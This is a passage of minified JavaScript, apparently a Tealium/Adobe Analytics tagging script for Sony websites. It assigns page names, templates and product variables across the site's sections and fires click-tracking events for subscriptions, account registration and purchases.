utag_data.aaLinkTrackVars="eVar24,events,eVar5",utag_data.aaLinkTrackEvents="unsubscribe"===a?"event62":"event61",utag_data.aaEvents.push(utag_data.aaLinkTrackEvents),utag_data.aaEmailSubscritpion=""!==o?o:e,utag_data.aaLinkType="o",utag_data.aaLinkName="my account:email subscription",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray()),t(e,a)}}},_bsq.aa.regional_newsletterSubscriptionTrackingAccountSteps=function(e){void 0!==e&&"mysonyregistration"===e&&"undefined"!=typeof jQuery&&jQuery("input#create").on("click",(function(e){var t=[];jQuery('input[type="checkbox"][path="mySonySubscriptions"]').each((function(e,a){jQuery(a).is(":checked")&&t.push(jQuery('label[for="'+jQuery(a).attr("id")+'"]').find("span.text").text().trim())})),t.forEach((function(e,t){utag_data.aaLinkTrackVars="eVar24,events,eVar5",utag_data.aaLinkTrackEvents="event61",utag_data.aaEvents.push("event61"),utag_data.aaEmailSubscritpion=e,utag_data.aaLinkType="o",utag_data.aaLinkName="myaccount creation:email subscription",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}))}))},_bsq.aa.regional_mySonyCreateAccountNextSteps=function(e){var t=document.getElementById("createAccountForm");void 0!==e&&"odw:registration"===e&&"undefined"!=typeof jQuery&&null!==t&&jQuery("input.next-step").on("click",(function(e){var t=jQuery(e.target).closest("fieldset").index();0==t?utag_data.aaInteractionType="My sony EU registration | Next button  Account details":1==t&&(utag_data.aaInteractionType="My sony EU registration | Next button  Email preferences"),utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop6,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar58",utag_data.aaLinkTrackEvents="event19",utag_data.aaEvents.push("event19");var a=utag_data.aaPageName.trim();utag_data.aaLinkType="o",utag_data.aaLinkName="My sony EU registration - Account details",utag.link(utag_data,(function(e){utag_data.aaPageName=a,utag_data.aaLinkTrackVars="pageName",utag_data.aaLinkTrackEvents=""}),utag.ext.getAppMeasurementTagIDAsArray())}))},_bsq.aa.regional_mySonyRegisterProduct=function(e){/^odw:mysony:register( |)product/gi.test(e)&&"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery("#productRegistrationSubmit").on("click",(function(e){_bsq.utils.docCookies.setItem(_bsq.aa.prdRegistrationCookieName,"true")})),jQuery("#signInSubmit").on("click",(function(e){_bsq.utils.docCookies.setItem(_bsq.aa.prdExpressRegistrationCookieName,"true")})),jQuery("#getIdSubmit").on("click",(function(e){_bsq.utils.docCookies.setItem(_bsq.aa.prdExpressRegistrationCookieName,"true")})))},_bsq.aa.clear_aaUtagObj=function(e){var t=utag_data;if("client"===e)for(i in utag_data)/^aa/gi.test(i.toString())&&("string"==typeof utag_data[i]?t[i]="":Array.isArray(utag_data[i])?t[i]=[]:t[i]=void 0);return t},_bsq.aa.marketingAndSupportAdobeVariables=function(e,t,o){if("glb"===o.page.section.toLowerCase()){switch(o.page.pageTemplate.toLowerCase()){case"home":c=(c="glb:"+o.page.name).toLowerCase(),l=o.page.pageTemplate.toLowerCase();break;case"category":c=(c=void 0!==o.product.category2&&o.product.category2.length>0?"glb:category:"+o.product.category1+":"+o.product.category2:"glb:category:"+o.product.category1).toLowerCase(),l=o.page.pageTemplate.toLowerCase();break;case"gallery":c=(c="comparison"===o.page.layout?"glb:gallery:compare:"+o.product.category1+":"+o.product.category2+":"+o.page.tabs.activeTab:"glb:gallery:"+o.product.category1+":"+o.product.category2+":"+o.page.tabs.activeTab).toLowerCase(),l=o.page.pageTemplate.toLowerCase(),""!==_bsq.utils.getQueryParameter(window.location.search,"accessoriesfor")&&(c="glb:product accessories:"+_bsq.utils.getQueryParameter(window.location.search,"accessoriesfor"),l="product accessories");break;case"subgallery":c=(c="comparison"===o.page.layout?"glb:subgallery:compare:"+o.product.category1+":"+o.product.category2+":"+o.page.tabs.activeTab:"glb:subgallery:"+o.product.category1+":"+o.product.category2+":"+o.page.tabs.activeTab).toLowerCase(),l=o.page.pageTemplate.toLowerCase(),""!==_bsq.utils.getQueryParameter(window.location.search,"accessoriesfor")&&(c="glb:product accessories:"+_bsq.utils.getQueryParameter(window.location.search,"accessoriesfor"),l="product accessories");break;case"product_details":case"glb:reonpocket-en-":case"glb:reonpocket-zh-":c=(c="glb:pdp:"+o.product.category1+":"+o.product.category2).toLowerCase(),void 0!==o.product.supermodel&&o.product.supermodel.length>0?c=c+":"+o.product.supermodel[0].toUpperCase():void 0!==o.product.model&&o.product.model.length>0?c=c+":"+o.product.model[0].toUpperCase():void 0!==o.product.sku&&o.product.sku.length>0&&(c=c+":"+o.product.sku[0].toUpperCase()),l="pdp";break;case"product_tech_specs":c=(c="glb:pdp-specs:"+o.product.category1+":"+o.product.category2).toLowerCase(),void 0!==o.product.supermodel&&o.product.supermodel.length>0?c=c+":"+o.product.supermodel[0].toUpperCase():void 0!==o.product.model?c=c+":"+o.product.model[0].toUpperCase():void 0!==o.product.sku&&o.product.sku.length>0&&(c=c+":"+o.product.sku[0].toUpperCase()),l="pdp:tech-specs";break;case"out_of_flow":if(c="glb:"+o.page.name.replace("out_of_flow:","oof:").replace("_oof",""),l="oof",o.page.name.indexOf("out_of_flow:Page-Transition")>-1)""===(f="")&&""!==_bsq.utils.getQueryParameter(window.location.search,"product")&&(f=_bsq.utils.getQueryParameter(window.location.search,"product")),l="transition",c="glb:transition:"+f;/(Page-Regional-OOFM-en_GL-DealerLocator-....|Page-Dealer-Locator_TEST)/gi.test(o.page.template_revision)&&(l="dealerlocator",c="glb:dealer locator:search");break;case"other":"all-electronics"===o.page.template_revision?(c="glb:all-electronics",l="all-electronics"):"locale_selector"===o.page.template_revision?(c="glb:locale-selector",l="locale-selector"):"language-selection"===o.page.template_revision?(c="glb:language-selection",l="language-selection"):"error-default"===o.page.template_revision?(c="glb:error-404",l="error"):"error_page"===o.page.template_revision?(c="glb:error-503",l="error"):"search-results"===o.page.template_revision?(c="glb:search",l="results",void 0!==o.search.current_category&&"all"!==o.search.current_category&&(c=c+":"+o.search.current_category)):"no-search-results"===o.page.template_revision?(c="glb:search",l="no results",void 0!==o.search.current_category&&"all"!==o.search.current_category&&(c=c+":"+o.search.current_category)):"favorites"===o.page.template_revision||o.page.template_revision.indexOf("Page-Favorites")>-1?(c="glb:my favorites",l="my favorites"):(c="glb:"+o.page.name,l="other");break;default:c="glb:"+o.page.name,l=o.page.pageTemplate}if(void 0!==o.product&&(t.aaCurrencyCode=o.product.currency||""),t.aaPageName=c,"error"===l&&_bsq.aa.all_isHtmlError(t.aaPageName,l)&&(t.aaPageType="errorPage"),t.aaPageName.indexOf("server_error")>-1&&_bsq.aa.all_isHtmlError(t.aaPageName,l)&&(t.aaPageType="errorPage"),t.aaPageTemplate=l,t.aaProductTier=o.product.tier||"",t.aaProductCategory1=o.product.category1||"",t.aaProductCategory2=o.product.category2||"",t.aaProductCategory3=o.product.category3||"","pdp"===l&&(t.aaProductCategoryStructure='D=c32+":"+c34+">"+c35+">"+c36'),""===t.aaUserID&&""!==_bsq.utils.docCookies.getItem("sonyUserID")&&(t.aaUserID=_bsq.utils.all_maskPIIData(_bsq.utils.docCookies.getItem("sonyUserID"))),!_bsq.utils.docCookies.getItem("sonyUserAnalytics")||"false"!==_bsq.utils.docCookies.getItem("s_userloginStatus")&&""!==_bsq.utils.docCookies.getItem("s_userloginStatus"))""===_bsq.utils.docCookies.getItem("sonyUserAnalytics")&&"true"===_bsq.utils.docCookies.getItem("s_userloginStatus")&&_bsq.utils.docCookies.setItem("s_userloginStatus","false");else{_bsq.utils.docCookies.setItem("s_userloginStatus","true");try{var r=JSON.parse(_bsq.utils.docCookies.getItem("sonyUserAnalytics"));void 0!==r.accountType&&/new/gi.test(r.accountType)?(t.aaEvents.push("event60,event64"),t.aaRegionalV156=void 0!==r.userType?r.userType:"",/gcim/gi.test(t.aaRegionalV156)&&(t.aaRegionalV156="standard")):(t.aaEvents.push("event64"),t.aaRegionalV156=void 0!==r.userType?r.userType:"",/gcim/gi.test(t.aaRegionalV156)&&(t.aaRegionalV156="standard"))}catch(e){utag.DB("Error in Login/Register tracking:"+e.message)}}if("transition"===l){var n="",s="",d="";void 0!==o.transition&&void 0!==o.transition.selection&&(d=o.transition.selection.sku||"",s=o.transition.selection.model||"",n=o.transition.selection.supermodel||"");var u=[];""!==n?u.push("s:"+n):u.push("s:n-a"),""!==s?u.push("m:"+s):u.push("m:n-a"),""!==d?u.push("sku:"+d):u.push("sku:n-a"),t.aaProductStructure=u.join("|"),/sonygwt-gwn-eu-(prod|sit)/gi.test(_bsq.aa.all_getRSID(o.page.country))&&(t.aaRegionalC57=_bsq.aa.transition_EURetailersNames(),_bsq.aa.transition_EURetailersUrl(),t.aaRegionalV152=t.aaRegionalC57),"RU"!==o.page.country&&"KZ"!==o.page.country&&"UA"!==o.page.country||_bsq.aa.transition_RURetailersPromotionClicks()}if(("where to buy"===l||l.toLowerCase().indexOf("transition")>=0)&&(t.aaRetailersNumber=_bsq.aa.transition_dealersNumber(o.page.country)+""),""!==o.search.resultCount&&(t.aaSearchTerm=_bsq.utils.all_maskPIIData(o.search.term),t.aaSearchResults=o.search.resultCount),""!==_bsq.utils.docCookies.getItem(_bsq.aa.typeaheadTermCookieName)&&(t.aaSearchTerm=_bsq.utils.all_maskPIIData(_bsq.utils.docCookies.getItem(_bsq.aa.typeaheadTermCookieName)),_bsq.utils.docCookies.setItem(_bsq.aa.typeaheadTermCookieName,"")),void 0!==o.search.suggestions&&void 0!==o.search.suggestions.results&&(t.aaSearchRecommendationsNumber=o.search.suggestions.results),"pdp"===l&&(o.product.supermodel.length>0||o.product.model.length>0||o.product.sku.length>0)?(1===o.product.supermodel.length?t.aaProducts=[o.product.supermodel[0]]:1===o.product.model.length?t.aaProducts=[o.product.model[0]]:t.aaProducts=[o.product.sku[0]],void 0!==o.product&&void 0!==o.product.price&&""!==o.product.price&&"pdp"===l&&t.aaEvents.push("event24"),t.aaProductFavoriteStatus=!0===jQuery("div.ps-favourites-wrap span.favorite-holder").hasClass("active")?"favorite-on":"favorite-off"):"my favorites"===l&&""!==_bsq.utils.docCookies.getItem("gwt_favorite_products")&&(t.aaProducts=_bsq.aa.myfavorites_FavoriteProductsList()),t.aaProductPrice=o.product.price||"",-1===l.indexOf("pdp")&&-1===l.indexOf("reviews_listing")||!(o.product.supermodel.length>0||o.product.model.length>0||o.product.sku.length>0)||(1===o.product.supermodel.length?t.aaProductSKUPredefined=o.product.supermodel[0]:1===o.product.model.length?t.aaProductSKUPredefined=o.product.model[0]:t.aaProductSKUPredefined=o.product.sku[0]),t.aaProductSKU=o.product.sku.join(","),t.aaProductCategory3?t.aaProductCategoryTree='D=c34+">"+c35+">"+c36':t.aaProductCategory2?t.aaProductCategoryTree='D=c34+">"+c35':t.aaProductCategory1&&(t.aaProductCategoryTree="D=c34"),"pdp"===l&&(void 0!==o.product.reviewsCount&&""!==o.product.reviewsCount?t.aaReviewsNumber=o.product.reviewsCount:t.aaReviewsNumber="zero",void 0!==o.product.ratingAverage&&""!==o.product.ratingAverage?t.aaReviewsNumber=t.aaReviewsNumber+" | "+Number(o.product.ratingAverage).toFixed(2):t.aaReviewsNumber=t.aaReviewsNumber+" | zero"),/^(pdp|transition|reviews_listing|pdp:tech-specs)$/gi.test(l)&&/^(RU|KZ|UA)$/gi.test(o.page.country)&&(t.aaRegionalV154=_bsq.aa.getMostGranularProductID(o.product)),/^(pdp|reviews_listing|pdp:tech-specs)$/gi.test(l)&&/^sonygwt-gwn-eu-(sit|prod)$/gi.test(_bsq.aa.all_getRSID(utag_data.aaCountry))){var m=jQuery(".buy-button[data-id^='buyButton']").attr("href");/store/gi.test(m)?t.aaRegionalV169="store":/electronics/gi.test(m)?t.aaRegionalV169="transition":/pro\.sony/gi.test(m)?t.aaRegionalV169="pro":t.aaRegionalV169="other"}"pdp"===l&&(t.aaEvents.push("event26"),t.aaEvents.push("prodView")),"transition"===l&&(t.aaEvents.push("event32"),"undefined"!=typeof sony&&void 0!==o.transition&&void 0!==o.transition.selection&&void 0!==o.transition.selection.sku&&(t.aaProducts=[o.transition.selection.sku])),"reviews_listing"===l&&/^cl:(pdp-reviews_awards_v2|pdp-product_summary-reviews_link|where_to_buy_reviews_link|pdp-product_summary)$/gi.test(utag_data.aaNavigationLinkCookie)&&t.aaEvents.push("event27"),void 0!==t.aaSearchTerm&&""!==t.aaSearchTerm&&t.aaEvents.push("event36"),void 0!==t.aaSearchResults&&""!==t.aaSearchResults&&t.aaEvents.push("event35="+t.aaSearchResults),"HK"===o.page.country&&(document.URL.toLowerCase().indexOf("/reg-thx.jsp")>-1&&document.URL.toLowerCase().indexOf("/mobile/")>-1?(""!==_bsq.utils.getQueryParameter(window.location.search,"modelNo")&&(t.aaProducts=[_bsq.utils.getQueryParameter(window.location.search,"modelNo")]),t.aaEvents.push("event65")):/(memberand)?warrantysuccess\.jsp/gi.test(document.URL)?void 0!==o.registration&&void 0!==o.registration.productModel&&void 0!==o.registration.purchaseDealer&&""!==o.registration.productModel&&""!==o.registration.purchaseDealer&&"null"!==o.registration.productModel&&"null"!==o.registration.purchaseDealer&&(t.aaProducts=[o.registration.productModel],t.aaRegionalV150=o.registration.purchaseDealer,t.aaEvents.push("event65")):/member\/(zh|en)\/memberRegInfoSuccess\.jsp/gi.test(document.URL)&&t.aaEvents.push("event60"))}else if("spt"===o.page.section.toLowerCase()){var y=[];if(void 0!==o&&void 0!==o.product&&void 0!==(y=[o.product.category1||"",o.product.category2||"",o.product.category3||"",o.product.category4||"",o.product.category5||"",o.product.category6||"",o.product.category7||""])&&y.constructor===Array)for(i=y.length;i>=0;i--)void 0===y[i]||null!==y[i]&&""!==y[i]||y.splice(i,1);switch(o.page.pageTemplate.toLowerCase()){case"home":case"home:results":c=(c="spt:"+o.page.name).toLowerCase(),l="support-"+o.page.pageTemplate.toLowerCase();break;case"download":var v=window.location.pathname.split("/").pop();c=(c="spt:"+o.page.pageTemplate+":"+v).toLowerCase(),l="support-"+o.page.pageTemplate.toLowerCase();break;case"category":case"category:results":case"category:faqs":case"category:faqs:results":c="spt:"+o.page.pageTemplate.toLowerCase()+":"+_bsq.aa.spt_getDeepestCategoryLevel(y),l="support-"+o.page.pageTemplate.toLowerCase();break;case"product:details":case"product:results":case"product:faqs":case"product:faqs:results":case"product:specs":var f="",b="",w="";try{f=_bsq.aa.spt_getProductName(o.product.model),b=o.product.category1||"",w=o.product.category2||""}catch(e){}c=(c=""!==b&&""!==w?"spt:"+o.page.pageTemplate.toLowerCase().replace("product","pdp")+":"+b+":"+w+":"+f:""!==b?"spt:"+o.page.pageTemplate.toLowerCase().replace("product","pdp")+":"+b+":"+f:""!==w?"spt:"+o.page.pageTemplate.toLowerCase().replace("product","pdp")+":"+w+":"+f:"spt:"+o.page.pageTemplate.toLowerCase().replace("product","pdp")+":"+f).replace("pdp:details","pdp"),l="support-"+o.page.pageTemplate.toLowerCase();break;case"other":"error-default"===o.page.template_revision?(c="spt:error-404",l="error"):(c="spt:"+o.page.name,l="other");break;case"spt:dealer locator":l="dealerlocator",c="spt:"+o.page.name;break;case"faq":v=window.location.pathname.split("/").pop();c=(c="spt:"+o.page.pageTemplate+":"+v).toLowerCase(),l="support-"+o.page.pageTemplate;break;case"quality-issue":v=window.location.pathname.split("/").pop();c=(c="spt:"+o.page.pageTemplate+":"+v).toLowerCase(),l="support-"+o.page.pageTemplate;break;case"oof":v=window.location.pathname.split("/").pop();c=(c="spt:"+o.page.pageTemplate+":"+v).toLowerCase(),l="support-"+o.page.pageTemplate;break;default:c=(c="spt:"+o.page.name).toLowerCase(),l=o.page.pageTemplate}if(c=c.toLowerCase(),l=l.toLowerCase(),c=c.replace("spt:spt:","spt:"),l=l.replace("spt:spt:","spt:"),void 0!==o.product&&(t.aaCurrencyCode=o.product.currency||""),t.aaPageName=c,"error"===l&&_bsq.aa.all_isHtmlError(t.aaPageName,l)&&(t.aaPageType="errorPage"),t.aaPageName.indexOf("server_error")>-1&&_bsq.aa.all_isHtmlError(t.aaPageName,l)&&(t.aaPageType="errorPage"),t.aaPageTemplate=l,t.aaSWTProductCategories=y.join(">"),""!==o.search.resultCount&&(t.aaSearchTerm=_bsq.utils.all_maskPIIData(o.search.term),t.aaSearchResults=o.search.resultCount),""!==_bsq.utils.docCookies.getItem(_bsq.aa.typeaheadTermCookieName)&&(t.aaSearchTerm=_bsq.utils.all_maskPIIData(_bsq.utils.docCookies.getItem(_bsq.aa.typeaheadTermCookieName)),_bsq.utils.docCookies.setItem(_bsq.aa.typeaheadTermCookieName,"")),(-1!==l.indexOf("product:")&&o.product.model.length>0||o.product.model.length>0&&/^support-(faq|quality-issue|download|oof)$/gi.test(l))&&(t.aaProducts=[o.product.model[0]],t.aaProductSKUPredefined=o.product.model[0]),o.page.pageTemplate.indexOf(":results")>-1&&(t.aaInternalSearchesCount=_bsq.aa.spt_countInternalSearches(),t.aaSearchTerm=_bsq.utils.all_maskPIIData(o.search.term)),t.aaSWTNavigationChannel=_bsq.aa.spt_supportNavigationChannel(),""!==o.support.filter_type&&(t.aaSWTFilterType=o.support.filter_type.toLowerCase()),""!==o.support.site_class&&(t.aaSWTAgentProfile=o.support.site_class+":"+o.support.agent_id+":"+o.support.agent_team+":"+o.support.agent_country+":"+o.support.access),/^support-(faq|quality-issue|download|oof)$/gi.test(l)){var k="";try{k=l.split("support-")[1].charAt(0)}catch(e){}t.aaSWTArticleId=k+":"+o.page.name.replace(o.page.pageTemplate+":","")+":"+(""===o.support.article_name?document.getElementsByClassName("js-search-download-title")[0].innerText||"":o.support.article_name),t.aaSWTFilterType=""!==_bsq.utils.docCookies.getItem(_bsq.aa.supportByTypeCookie)?_bsq.utils.docCookies.getItem(_bsq.aa.supportByTypeCookie):""}else _bsq.utils.docCookies.setItem(_bsq.aa.supportByTypeCookie,o.support.filter_type,"");if(""!==o.support.crm_case_id&&(t.aaSWTCRMCaseId=o.support.crm_case_id),""!==o.support.channel_name&&(t.aaSWTLandingChannel=o.support.channel_name),t.aaSWTPopularTopics=o.support.topics.join(";").toLowerCase()||"",(void 0!==o.search&&void 0!==o.search.resultCount&&""!==o.search.resultCount||void 0!==t.aaSearchTerm&&""!==t.aaSearchTerm)&&(t.aaEvents.push("event36"),void 0!==o.search.resultCount&&""!==o.search.resultCount&&t.aaEvents.push("event35="+t.aaSearchResults),"0"==t.aaSearchResults&&t.aaEvents.push("event38")),/\/electronics\/support\/tvhelp/gi.test(document.URL))try{utag_data.aaDebug=document.URL+"|"+(new SonyAnalytics).build().analytics.page.template+"|"+(new SonyAnalytics).build().analytics.page.name}catch(e){utag_data.aaDebug=e}_bsq.aa.spt_download_filters(),_bsq.aa.spt_getOSFirmwareVersion(),_bsq.aa.spt_getTogglePattern(),"client"!==e&&(_bsq.aa.spt_microSurveyTracking(),_bsq.aa.spt_supportByType(),_bsq.aa.spt_trackDownloads(),_bsq.aa.search_trackClicks(),_bsq.aa.spt_chatBotOpened(),_bsq.aa.spt_video_banner(),_bsq.aa.spt_collapsible_sections(),_bsq.aa.spt_euChatInteraction(),_bsq.aa.spt_faqClicksInSection(),/^regional:swt/gi.test(utag_data.website_platform)&&(/\/microsite\/support\/interactive/gi.test(window.location.pathname)||/27\.54\.47\.101:8085/gi.test(document.URL))&&_bsq.aa.spt_spaInteractionTracking())}else if(/(odw|cmt|crm|rus|ext|sss)/gi.test(o.page.section)){void 0!==o.page.name&&o.page.name.indexOf("sitemap404")>-1?c=o.page.section+":"+o.page.name:void 0!==o.page.name&&o.page.name.indexOf("odw:error:404")>-1&&(c=o.page.section+":error 404 static"),""===(c=(c=""===c?o.page.name:c).replace(/ : /g,":").replace(/ - /g,":").toLowerCase())&&"undefined"!=typeof Tags_Pagename2&&"Checkout::Choose_payment_options"===Tags_Pagename2&&(c="crm:checkout:choose payment options"),(-1===c.indexOf(o.page.section)||c.indexOf(o.page.section)>4)&&(c=o.page.section+":"+c);var T=null===document.getElementById("section-sorry")?"":"errorSectionFound";"errorSectionFound"===T&&"odw:"===c&&(c+="missing-page-error"),l=(l=""===l?o.page.pageTemplate.toLowerCase():l.toLowerCase()).replace(/ : /g,":").replace(/ - /g,":").toLowerCase(),void 0!==o.product&&(t.aaCurrencyCode=o.product.currency||""),t.aaPageName=c,t.aaPageTemplate=l,-1!==l.indexOf("error")&&_bsq.aa.all_isHtmlError(t.aaPageName,l)&&(t.aaPageType="errorPage"),-1!==l.indexOf("sorry")&&_bsq.aa.all_isHtmlError(t.aaPageName,l)&&(t.aaPageType="errorPage"),"errorSectionFound"===T&&_bsq.aa.all_isHtmlError(t.aaPageName,T)&&(t.aaPageType="errorPage"),t.aaProductTier=o.product.tier||"",t.aaProductCategory1=o.product.category1||"",t.aaProductCategory2=o.product.category2||"",t.aaProductCategory3=o.product.category3||"",(o.product.supermodel.length>0||o.product.model.length>0||o.product.sku.length>0)&&(1===o.product.supermodel.length?t.aaProducts=[o.product.supermodel[0]]:1===o.product.model.length?t.aaProducts=[o.product.model[0]]:t.aaProducts=[o.product.sku[0]]),void 0!==t.aaProducts&&""!==t.aaProducts||0!==o.product.sku.length&&0!==o.product.model.length||(t.aaProducts=[_bsq.utils.docCookies.getItem("Tags_Product_SKU2")]),t.aaProductSKU=o.product.sku.join(","),t.aaProductCategory3?t.aaProductCategoryTree='D=c34+">"+c35+">"+c36':t.aaProductCategory2?t.aaProductCategoryTree='D=c34+">"+c35':t.aaProductCategory1&&(t.aaProductCategoryTree="D=c34"),"dealerlocator"===l&&t.aaEvents.push("event50"),void 0!==t.aaPageTemplate&&"blogarticle"===t.aaPageTemplate&&"undefined"!=typeof jQuery&&jQuery(".lia-message-body-content:first div:last-child").length>0&&jQuery(".lia-message-body-content:first div:last-child").html().length<150&&(t.aaRegionalC56=jQuery(".lia-message-body-content:first div:last-child").html()),("odw:mysony:validation complete"===t.aaPageName||void 0!==o.user&&void 0!==o.user.method&&"register"===o.user.method)&&(t.aaEvents.push("event60"),t.aaRegionalV156=o.user.accountType||""),""===_bsq.utils.docCookies.getItem("gpv_p1")&&""!==t.aaUserID?"odw:mysony:validation complete"!==t.aaPageName&&(t.aaEvents.push("event64"),t.aaRegionalV156=o.user.accountType||""):void 0!==o.user&&void 0!==o.user.method&&"login"===o.user.method&&(t.aaEvents.push("event64"),t.aaRegionalV156=o.user.accountType||""),void 0!==t.aaProductSKU&&t.aaProductSKU.length>5&&("true"==_bsq.utils.docCookies.getItem(_bsq.aa.prdRegistrationCookieName)||"true"==_bsq.utils.docCookies.getItem(_bsq.aa.prdExpressRegistrationCookieName))&&/(odw:mysony:productdetail:survey|odw:mysony:specialcontent|odw:mysony:productregistrationwarrantytab)/gi.test(t.aaPageName)?(t.aaEvents.push("event65"),_bsq.utils.docCookies.setItem(_bsq.aa.prdRegistrationCookieName,"",a),_bsq.utils.docCookies.setItem(_bsq.aa.prdExpressRegistrationCookieName,"",a)):""===_bsq.utils.getQueryParameter(window.location.search,"product")||"true"!=_bsq.utils.docCookies.getItem(_bsq.aa.prdRegistrationCookieName)&&"true"!=_bsq.utils.docCookies.getItem(_bsq.aa.prdExpressRegistrationCookieName)||!/(odw:mysony:productdetail:survey|odw:mysony:specialcontent|odw:mysony:productregistrationwarrantytab)/gi.test(t.aaPageName)||(t.aaProducts=[_bsq.utils.getQueryParameter(window.location.search,"product")],t.aaEvents.push("event65"),_bsq.utils.docCookies.setItem(_bsq.aa.prdRegistrationCookieName,"",a),_bsq.utils.docCookies.setItem(_bsq.aa.prdExpressRegistrationCookieName,"",a)),_bsq.utils.docCookies.setItem(_bsq.aa.prdRegistrationCookieName,"",a),/^odw:cashback:.*:personal-details$/gi.test(c)&&"undefined"!=typeof jQuery&&(_bsq.utils.docCookies.setItem(_bsq.aa.cashbackProductRegistration,"",a),jQuery("body").on("click",'section.form-section input[type="submit"]',(function(e){_bsq.utils.docCookies.setItem(_bsq.aa.cashbackProductRegistration,window.Tags_Product_Name||"")}))),/^odw:cashback:.*:thank-you$/gi.test(c)&&"undefined"!=typeof jQuery&&0===jQuery("div.validation-errors").children().length&&(void 0!==window.Tags_Product_Name&&""!==window.Tags_Product_Name&&null!==window.Tags_Product_Name?t.aaProducts=[window.Tags_Product_Name]:""!==_bsq.utils.docCookies.getItem(_bsq.aa.cashbackProductRegistration)?t.aaProducts=[_bsq.utils.docCookies.getItem(_bsq.aa.cashbackProductRegistration)]:t.aaProducts=[window.Tags_Product_Name],t.aaEvents.push("event65"),_bsq.utils.docCookies.setItem(_bsq.aa.cashbackProductRegistration,"",a),window.Tags_Product_Name=""),_bsq.aa.regional_newsletterSubscriptionTracking(l),_bsq.aa.regional_newsletterSubscriptionTrackingAccountSteps(l),_bsq.aa.regional_mySonyCreateAccountNextSteps(c),_bsq.aa.regional_mySonyRegisterProduct(c)}else c=o.page.section+":"+o.page.name.replace(o.page.section+":",""),l=o.page.pageTemplate||"","alp"!==o.page.section&&(l=l.replace(o.page.section+":","")),"sau"===o.page.section&&(_bsq.aa.sau_newsletterSubscription(),_bsq.aa.sau_storiesFilterSelection(),"articles:details"!==o.page.pageTemplate&&"alpha-academy:details"!==o.page.pageTemplate||_bsq.aa.sau_featuredProducts(),"error"===o.page.pageTemplate&&(utag_data.aaPageType="errorPage"),/^alpha-academy:videos$/.test(o.page.pageTemplate)&&(_bsq.aa.sau_alphaAcademyTutorials(),_bsq.aa.sau_alphaAcademyCollapsible(),_bsq.aa.sau_alphaAcademyVideoOpen())),"sau"===o.page.section&&/^sonygwt-gwn-(hk|sea|tw)-(sit|prod)$/gi.test(_bsq.aa.all_getRSID(o.page.country))&&document.addEventListener("apac_au_interaction",(function(e){utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar152",utag_data.aaLinkTrackEvents="event101",utag_data.aaEvents.push("event101"),utag_data.aaRegionalV152=e.detail.category+"|"+e.detail.action+"|"+(e.detail.label||""),utag_data.aaLinkType="o",utag_data.aaLinkName="apac_au_interaction",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())})),"amea"===o.page.section&&/^sonygwt-gwn-(kr|sea|tw)-(sit|prod)$/gi.test(_bsq.aa.all_getRSID(o.page.country))&&(document.addEventListener("buyClicked",(function(e){var t=e.detail;utag_data.aaLinkTrackVars="events,pageName,products,prop7,prop21,prop22,prop34,prop35,prop36,eVar21,eVar22,eVar5,prop6,eVar9",utag_data.aaLinkTrackEvents="event100",utag_data.aaEvents.push("event100"),utag_data.aaProductCategory1=t.productCategory1,utag_data.aaProductCategory2=t.productCategory2,utag_data.aaProductCategory3=t.productCategory3,utag_data.aaProducts=t.modelIDs,utag_data.aaLinkType="o",utag_data.aaLinkName="Buy button click",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())})),document.addEventListener("linkInteraction",(function(e){utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop6,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar58,eVar70",utag_data.aaLinkTrackEvents="event19",utag_data.aaEvents.push("event19"),utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,void 0!==e&&void 0!==e.detail.type&&void 0!==e.detail.label&&(utag_data.aaInteractionType="Link Interaction: "+e.detail.type+" | "+e.detail.label,utag_data.aaLinkType="o",utag_data.aaLinkName="microsite_link_interaction",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray()))}))),"prs"===o.page.section&&(_bsq.aa.prs_newsletterSubscription(),_bsq.aa.prs_filterSelection(),_bsq.aa.regional_bannerClick(),_bsq.aa.prs_searchResultClick(),_bsq.aa.prs_downloadAsset(),""!==o.search.resultCount&&(t.aaSearchTerm=_bsq.utils.all_maskPIIData(o.search.term),t.aaSearchResults=o.search.resultCount),void 0!==t.aaSearchTerm&&""!==t.aaSearchTerm&&t.aaEvents.push("event36"),void 0!==t.aaSearchResults&&""!==t.aaSearchResults&&t.aaEvents.push("event35="+t.aaSearchResults),"error"===o.page.pageTemplate&&(utag_data.aaPageType="errorPage")),"b2b"===o.page.section&&(_bsq.aa.regional_bannerClick(),_bsq.aa.b2b_secondaryNav(),_bsq.aa.b2b_conversionClick(),_bsq.aa.b2b_blockTracking()),"usa"===o.page.section&&/^SCA\:/gi.test(o.page.name)&&(c=c.replace("SCA:","")),"usa"===o.page.section&&!0===/^corporate/g.test(l)&&(c=c.replace(/\s/g,"-")),"syndicated content"===l&&(c=o.page.section+":syndicated content:"+o.page.name),/^(usa|ca)$/gi.test(o.page.section)&&(_bsq.aa.usa_productRegistration(c),_bsq.aa.usa_productRegistrationUnmatchedModels(c)),t.aaPageName=c,t.aaPageTemplate=l;return"errorPage"===t.aaPageType&&t.aaEvents.push("event6"),h(),"home"===l&&"glb"===o.page.section&&"undefined"!=typeof jQuery?(jQuery((function(){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery(".pagination-bullet, .pagination-bullets").on("click",(function(){setTimeout(p,1e3)})),jQuery(".pagination-paddle").on("click",(function(){setTimeout(p,1e3)})),jQuery(".one-sony-carousel").on("mouseup touchend",(function(){setTimeout(p,1e3)})),jQuery(".related-products").on("mouseup touchend",(function(){setTimeout(p,1e3)}))),jQuery(window).on("resize scrollHasStopped",p)})),function(){try{jQuery(document).ready((function(){var 